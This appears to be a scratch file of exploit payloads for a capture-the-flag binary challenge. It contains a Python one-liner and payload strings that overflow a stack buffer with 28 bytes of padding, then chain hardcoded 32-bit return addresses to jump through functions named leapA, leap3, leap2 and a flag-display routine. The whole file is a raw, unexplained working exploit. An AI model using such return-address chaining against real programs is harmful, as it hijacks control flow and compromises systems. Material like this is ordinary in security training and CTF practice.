
# python -c 'print "A"*28+"\xe6\x85\x04\x08"+"\x66\x86\x04\x08"+"\xfd\x85\x04\x08"+"\xb3\x86\x04\x08"+"\xef\xbe\xad\xde"'




payload = "A"*28+"\xe6\x85\x04\x08"+"\xc9\x87\x04\x08"+"\x66\x86\x04\x08"+"\xfd\x85\x04\x08"+"\xb3\x86\x04\x08"+"\xef\xbe\xad\xde"



main = "\xc9\x87\x04\x08"
leapA = "\xe6\x85\x04\x08"
gets = "\x30\x84\x04\x08"
leap3 = "\x66\x86\x04\x08"
true_leap3 = "\x90\x86\x04\x08"
leap2 = "\xfd\x85\x04\x08"
dflag = "\xb3\x86\x04\x08"